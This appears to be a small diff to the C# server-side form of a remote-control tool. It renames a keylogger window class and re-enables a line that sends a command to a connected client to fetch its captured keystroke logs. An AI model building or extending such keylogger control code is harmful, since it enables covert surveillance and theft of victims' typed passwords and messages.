@@ -1,16 +1,17 @@
 ﻿using Serveur.Controllers.Server;
+using Serveur.Packets.ServerPackets;
 using System;
 using System.IO;
 using System.Windows.Forms;
 
 namespace Serveur.Views
 {
-    public partial class FrmKeylogger : Form
+    public partial class FrmKeyLogger : Form
     {
         private readonly ClientMosaic _client;
         private readonly string _path;
 
-        public FrmKeylogger(ClientMosaic client)
+        public FrmKeyLogger(ClientMosaic client)
         {
             _client = client;
             client.value.frmKl = this;
@@ -43,7 +44,7 @@ namespace Serveur.Views
             btnGetLogs.Enabled = false;
             lvLogs.Items.Clear();
 
-            //new GetKeyLoggerLogs().Execute(_client);
+            new GetKeyLoggerLogs().Execute(_client);
         }
 
         private void lvLogs_ItemActivate(object sender, System.EventArgs e)
